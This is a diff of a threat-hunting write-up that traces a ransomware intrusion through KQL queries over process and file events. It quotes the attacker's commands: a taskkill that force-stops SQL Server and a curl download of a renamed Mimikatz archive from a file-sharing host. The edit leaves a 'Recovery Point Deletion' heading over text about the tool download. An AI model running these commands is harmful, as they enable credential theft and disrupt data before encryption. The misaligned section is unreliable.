@@ -299,29 +299,28 @@ DeviceProcessEvents
 
 ### 15. Defense Evasion: Process Termination
 
-Searched for evidence of...
-
-archive file creation events in the staging directory to identify the volume of data prepared for exfiltration and discovered that the attacker created eight distinct archives, representing comprehensive data collection across financial records, credentials, business contracts, and authentication databases. 
+Searched for evidence of process termination and discovered that the threat actor executed the following process termination command to forcefully terminate SQL Server: "taskkill" /F /IM sqlservr.exe. In addition, other database processes (e.g., MySQL, Oracle, PostgreSQL, MongoDB) and Office applications (e.g., Outlook, Excel) were also forcefully terminated across multiple systems. This was likely performed to release file locks on high-value data stores, ensuring the ransomware could successfully encrypt the underlying database files and documents without interference.
 
 **Query used to locate events:**
 
 ```kql
-DeviceFileEvents
-| where TimeGenerated >= datetime(2025-11-19)
-| where DeviceName == "azuki-adminpc"
-| where FileName has_any (".zip", ".7z", ".rar", ".tar", ".gz")
-| where FolderPath has "C:\\ProgramData\\Microsoft\\Crypto\\staging"  
-| project TimeGenerated, DeviceName, FileName, FolderPath, InitiatingProcessFileName
-| order by TimeGenerated asc
+DeviceProcessEvents
+| where TimeGenerated between (datetime(2025-11-20) .. datetime(2025-11-28))
+| where DeviceName contains "azuki"
+| where FileName in~ ("taskkill.exe", "wmic.exe")
+| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
+| sort by TimeGenerated asc
 
 ```
-<img width="2456" height="837" alt="BT_Q19" src="https://github.com/user-attachments/assets/8ee5ecde-2222-42c2-947d-14f1c4ab5347" />
+<img width="1894" height="937" alt="DITW_Q18" src="https://github.com/user-attachments/assets/16ddd328-4ee1-404b-afbd-0df5451b1b10" />
 
 ---
 
-### 16. Credential Access: Credential Theft Tool Download
+### 16. Impact: Recovery Point Deletion
 
-Searched for evidence of credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
+Searched for evidence of... 
+
+credential theft tool downloads and discovered that the attacker utilized the following curl command to potentially download a secondary credential theft tool: "curl.exe" -L -o m-temp.7z https://litter.catbox.moe/mt97cj.7z. In addition, m-temp is likely a renamed instance of Mimikatz, a well-known credential dumping tool. Renaming of the tool likely represents an attempt to appear innocuous and evade signature-based detection.
 
 **Query used to locate events:**
 
